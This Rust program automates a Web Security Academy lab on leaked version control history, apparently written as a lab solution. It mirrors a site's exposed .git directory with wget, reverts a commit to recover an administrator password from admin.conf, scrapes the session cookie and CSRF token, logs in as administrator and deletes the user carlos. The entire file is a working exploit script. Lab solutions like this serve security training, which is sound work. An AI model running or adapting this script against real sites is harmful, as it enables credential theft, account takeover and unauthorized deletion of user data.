/*******************************************************************
*
* Lab: Information disclosure in version control history
*
* Hack Steps: 
*      1. Fetch the .git directory
*      2. Reset to the previous commit
*      3. Get the administrator password from the admin.conf file
*      4. Login as administrator
*      5. Delete carlos
*
********************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    env, fs,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab DOMAIN
const LAB_DOMAIN: &str = "0a4a00790422864381bd1b0700a2004e.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching .git directory (wait a minute).. ");
    flush_terminal();

    let args = ["-r", &format!("https://{LAB_DOMAIN}/.git")];
    execute_shell_command("wget", &args);

    println!("{}", "OK".green());
    print!("⦗2⦘ Changing current working directory.. ");
    flush_terminal();

    change_working_directory();

    println!("{}", "OK".green());
    print!("⦗3⦘ Resetting to the previous commit.. ");
    flush_terminal();

    let args = ["reset", "--hard", "HEAD~1"];
    execute_shell_command("git", &args);

    println!("{}", "OK".green());
    print!("⦗4⦘ Reading admin.conf file..");
    flush_terminal();

    let admin_conf = read_file("admin.conf");

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the administrator password.. ");
    flush_terminal();

    let first_line = admin_conf.lines().next().unwrap();
    let admin_pass = first_line.split("=").nth(1).unwrap();

    println!("{} => {}", "OK".green(), admin_pass.yellow());
    print!("⦗6⦘ Fetching the login page to get a valid session and csrf token.. ");
    flush_terminal();

    let login_page = fetch("/login");
    let session = get_session_cookie(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗7⦘ Logging in as administrator..");
    flush_terminal();

    let login_as_admin = login_as_admin(&admin_pass, &session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗8⦘ Deleting carlos..");
    flush_terminal();

    let admin_session = get_session_cookie(&login_as_admin);
    delete_carlos(&admin_session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn execute_shell_command(command: &str, args: &[&str]) {
    process::Command::new(command)
        .args(args)
        .output()
        .expect(&format!(
            "⦗!⦘ Failed to execute the command: {}",
            command.red()
        ));
}

fn change_working_directory() {
    env::set_current_dir(format!("{LAB_DOMAIN}")).expect(&format!(
        "{}",
        "⦗!⦘ Failed to change current working directory".red()
    ));
}

fn read_file(filename: &str) -> String {
    fs::read_to_string("admin.conf").expect(&format!("⦗!⦘ Failed to read {} file", filename.red()))
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("https://{LAB_DOMAIN}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn login_as_admin(admin_pass: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("https://{LAB_DOMAIN}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", admin_pass),
            ("csrf", &csrf_token),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as admin".red()))
}

fn delete_carlos(session: &str) {
    WEB_CLIENT
        .get(format!("https://{LAB_DOMAIN}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to delete carlos".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
